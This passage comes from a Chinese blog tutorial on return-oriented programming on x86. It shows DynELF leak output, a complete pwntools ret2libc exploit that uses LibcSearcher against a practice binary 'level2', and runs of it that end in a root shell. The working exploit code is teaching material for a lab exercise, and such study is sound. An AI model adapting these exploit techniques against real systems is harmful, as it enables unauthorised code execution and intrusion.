class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_lev2_DynELF.py </span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/level2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">vulfun_addr= 0x8048460</span><br><span class="line">[+] Starting local process &apos;./level2&apos;: pid 3988</span><br><span class="line">0x8048000 =&gt; 7f454c46</span><br><span class="line">[+] Loading from &apos;/home/idter/Documents/ROP/level2&apos;: 0xf7f86918</span><br><span class="line">0x804a004 =&gt; 1869f8f7</span><br><span class="line">[+] Resolving &apos;system&apos; in &apos;libc.so&apos;: 0xf7f86918</span><br><span class="line">0x8049f14 =&gt; 01000000</span><br><span class="line">0x8049f1c =&gt; 0c000000</span><br><span class="line">0x8049f24 =&gt; 0d000000</span><br><span class="line">0x8049f2c =&gt; 19000000</span><br><span class="line">0x8049f34 =&gt; 1b000000</span><br><span class="line">0x8049f3c =&gt; 1a000000</span><br><span class="line">0x8049f44 =&gt; 1c000000</span><br><span class="line">0x8049f4c =&gt; f5feff6f</span><br><span class="line">0x8049f54 =&gt; 05000000</span><br><span class="line">0x8049f5c =&gt; 06000000</span><br><span class="line">0x8049f64 =&gt; 0a000000</span><br><span class="line">0x8049f6c =&gt; 0b000000</span><br><span class="line">0x8049f74 =&gt; 15000000</span><br><span class="line">0x8049f7c =&gt; 03000000</span><br><span class="line">0x8049f80 =&gt; 00a00408</span><br><span class="line">0xf7f86928 =&gt; 00000000</span><br><span class="line">0xf7f8691c =&gt; 046cf8f7</span><br><span class="line">0xf7f86c04 =&gt; 00000000</span><br><span class="line">0xf7f86924 =&gt; 086cf8f7</span><br><span class="line">0xf7f86c0c =&gt; 746ef8f7</span><br><span class="line">0xf7f86e74 =&gt; 00000000</span><br><span class="line">0xf7f86c14 =&gt; b0c1f5f7</span><br><span class="line">0xf7f5c1b4 =&gt; 90c1f5f7</span><br><span class="line">0xf7f5c190 =&gt; 2f6c6962</span><br><span class="line">0xf7f5c194 =&gt; 2f693338</span><br><span class="line">0xf7f5c198 =&gt; 362d6c69</span><br><span class="line">0xf7f5c19c =&gt; 6e75782d</span><br><span class="line">0xf7f5c1a0 =&gt; 676e752f</span><br><span class="line">0xf7f5c1a4 =&gt; 6c696263</span><br><span class="line">0xf7f5c1a8 =&gt; 2e736f2e</span><br><span class="line">0xf7f5c1ac =&gt; 36000000</span><br><span class="line">0xf7f5c1b0 =&gt; 00a0d8f7</span><br><span class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</span><br><span class="line">0xf7d8a000 =&gt; 7f454c46</span><br><span class="line">0xf7f5c1b8 =&gt; b0bdf3f7</span><br><span class="line">0xf7d8a004 =&gt; 01010103</span><br><span class="line">0xf7f3bdb0 =&gt; 01000000</span><br><span class="line">0xf7f3bdb8 =&gt; 0e000000</span><br><span class="line">0xf7f3bdc0 =&gt; 0c000000</span><br><span class="line">0xf7f3bdc8 =&gt; 19000000</span><br><span class="line">0xf7f3bdd0 =&gt; 1b000000</span><br><span class="line">0xf7f3bdd8 =&gt; 04000000</span><br><span class="line">0xf7f3bde0 =&gt; f5feff6f</span><br><span class="line">0xf7f3bde8 =&gt; 05000000</span><br><span class="line">0xf7f3bdf0 =&gt; 06000000</span><br><span class="line">0xf7f3bdf8 =&gt; 0a000000</span><br><span class="line">0xf7f3be00 =&gt; 0b000000</span><br><span class="line">0xf7f3be08 =&gt; 03000000</span><br><span class="line">0xf7f3be0c =&gt; 00c0f3f7</span><br><span class="line">0xf7d8a010 =&gt; 03000300</span><br><span class="line">0xf7f3c004 =&gt; b0c1f5f7</span><br><span class="line">0xf7f5c1c0 =&gt; 086cf8f7</span><br><span class="line">0xf7f86c18 =&gt; 1869f8f7</span><br><span class="line">0xf7d8a180 =&gt; 474e5500</span><br><span class="line">0xf7d8a184 =&gt; dd5192a7</span><br><span class="line">0xf7d8a188 =&gt; 69e33ed6</span><br><span class="line">0xf7d8a18c =&gt; ca68a6ab</span><br><span class="line">0xf7d8a190 =&gt; 5740ff9e</span><br><span class="line">0xf7d8a194 =&gt; 8ec678a7</span><br><span class="line">[*] Trying lookup based on Build ID: dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] Skipping unavialable libc dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf7f3bde0</span><br><span class="line">0xf7f3bde4 =&gt; b8a1d8f7</span><br><span class="line">[*] Found DT_STRTAB at 0xf7f3bde8</span><br><span class="line">0xf7f3bde4 =&gt; b8a1d8f7</span><br><span class="line">[*] Found DT_STRTAB at 0xf7f3bde8</span><br><span class="line">0xf7f3bdec =&gt; 1876d9f7</span><br><span class="line">[*] Found DT_SYMTAB at 0xf7f3bdf0</span><br><span class="line">0xf7f3bdf4 =&gt; 28dfd8f7</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">0xf7d8a1b8 =&gt; f3030000</span><br><span class="line">0xf7d8a1bc =&gt; 0a000000</span><br><span class="line">0xf7d8a1c0 =&gt; 00020000</span><br><span class="line">[*] hash chain index</span><br><span class="line">0xf7d8b390 =&gt; b1050000</span><br><span class="line">[*] hash chain</span><br><span class="line">0xf7d8d030 =&gt; 8ae4ee1c</span><br><span class="line">0xf7d93a38 =&gt; 48310000</span><br><span class="line">0xf7d9a760 =&gt; 73797374</span><br><span class="line">0xf7d9a764 =&gt; 656d0074</span><br><span class="line">0xf7d93a3c =&gt; a0ad0300</span><br><span class="line">system_addr=0xf7dc4da0</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">sending payload2 ...###</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>也可以使用LibcSearcher工具来确认libc版本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./level2&apos;)</span><br><span class="line">p = process(&apos;./level2&apos;)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">#write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">#vulnerable_func = 0x0804843b</span><br><span class="line"></span><br><span class="line">vulnerable_func = elf.symbols[&apos;main&apos;]</span><br><span class="line"></span><br><span class="line"># write(1, read_got, 4)</span><br><span class="line"></span><br><span class="line"># Then return to vulnerable_function()</span><br><span class="line"></span><br><span class="line"># This step&apos;s purpose is to get the real memory address of libc function read(). Other libc functions are OK too. Such as function write(). </span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*140 + p32(write_plt) + p32(vulnerable_func) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr = p.recv(4)</span><br><span class="line">read_addr = u32(read_addr)</span><br><span class="line">print &quot;####read_addr= &quot; + hex(read_addr)</span><br><span class="line"></span><br><span class="line"># Once we get the address of read(), we can confirm libc version by using LibcSearcher. Then we get libc offset of system() and &quot;/bin/sh&quot;.</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;read&quot;, read_addr) # 搜索过程中需要稍等一会儿</span><br><span class="line">system_offset = libc.dump(&quot;system&quot;) </span><br><span class="line">binsh_offset = libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">read_offset = libc.dump(&quot;read&quot;)</span><br><span class="line"></span><br><span class="line"># we can calculate the libc base address, system() and &quot;/bin/sh&quot; address by formula &quot;base address + offset = real address&quot;</span><br><span class="line"></span><br><span class="line">libc_base_addr = read_addr - read_offset</span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line"></span><br><span class="line"># system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">payload1 = &apos;a&apos;*140 + p32(system_addr) + p32(vulnerable_func) + p32(binsh_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_LibcSearcher.py </span><br><span class="line">[*] &apos;/home/idter/Documents/ROP/level2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting local process &apos;./level2&apos;: pid 5092</span><br><span class="line"></span><br><span class="line">####read_addr= 0xf7ea6b00</span><br><span class="line"></span><br><span class="line">[+] ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu10_i386) be choosed.</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-序"><span class="toc-number">1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-level1-Control-Flow-Hijack-程序流劫持"><span class="toc-number">2.</span> <span class="toc-text">0x01 level1(Control Flow Hijack 程序流劫持)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-level2-Bypass-DEP-通过ret2libc绕过DEP防护"><span class="toc-number">3.</span> <span class="toc-text">0x02 level2(Bypass DEP 通过ret2libc绕过DEP防护)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Bypass-DEP-and-ASLR-通过ROP绕过DEP和ASLR防护"><span class="toc-number">4.</span> <span class="toc-text">0x03 Bypass DEP and ASLR 通过ROP绕过DEP和ASLR防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Memory-Leak-amp-DynELF（在不获取目标libc-so的情况下进行ROP攻击）"><span class="toc-number">5.</span> <span class="toc-text">0x04 Memory Leak&amp;DynELF（在不获取目标libc.so的情况下进行ROP攻击）</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&text=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&is_video=false&description=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=一步一步学 ROP 笔记 - x86 篇&body=Check out this article: http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&title=一步一步学 ROP 笔记 - x86 篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记x86篇/&name=一步一步学 ROP 笔记 - x86 篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Yuewei.Liang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
